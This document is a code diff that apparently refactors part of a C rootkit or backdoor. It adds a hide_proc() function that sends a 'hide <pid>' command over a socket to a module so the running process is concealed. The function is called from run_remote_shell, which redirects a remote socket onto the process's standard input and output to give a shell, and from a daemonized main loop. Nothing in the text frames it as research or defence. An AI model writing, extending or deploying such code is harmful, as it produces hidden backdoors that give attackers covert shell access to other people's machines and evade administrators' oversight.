@@ -58,6 +58,14 @@ pid_t wrapped_fork(void) {
     return pid;
 }
 
+void hide_proc(void) {
+    unsigned char buffer[30];
+    memset(buffer, 0, 30);
+    sprintf((char*) buffer, "hide %d", getpid());
+    printf("Writing %s to module on process start\n", buffer);
+    write(conn_sock, buffer, strlen((char*) buffer));
+}
+
 /*
  * function:
  *    run_remote_shell
@@ -97,11 +105,7 @@ void run_remote_shell(void) {
 
     sleep(1);
 
-    unsigned char buffer[30];
-    memset(buffer, 0, 30);
-    sprintf((char*) buffer, "hide %d", getpid());
-    printf("Writing %s to module on process start\n", buffer);
-    write(conn_sock, buffer, strlen((char*) buffer));
+    hide_proc();
 
     dup2(remote_sock, 0);
     dup2(remote_sock, 1);
@@ -343,10 +347,7 @@ int main(void) {
 
         //sleep(3);
 
-        memset(buffer, 0, 30);
-        sprintf((char*) buffer, "hide %d", getpid());
-        printf("Writing %s to module on process start\n", buffer);
-        write(conn_sock, buffer, strlen((char*) buffer));
+        hide_proc();
 
         for (;;) {
             int n = waitForEpollEvent(efd, eventList);
@@ -380,10 +381,7 @@ int main(void) {
     } else {
         setsid();
 
-        memset(buffer, 0, 30);
-        sprintf((char*) buffer, "hide %d", getpid());
-        printf("Writing %s to module on process start\n", buffer);
-        write(conn_sock, buffer, strlen((char*) buffer));
+        hide_proc();
 
         //See if I can remove unix socket files after connection
         unlink(UNIX_SOCK_PATH);
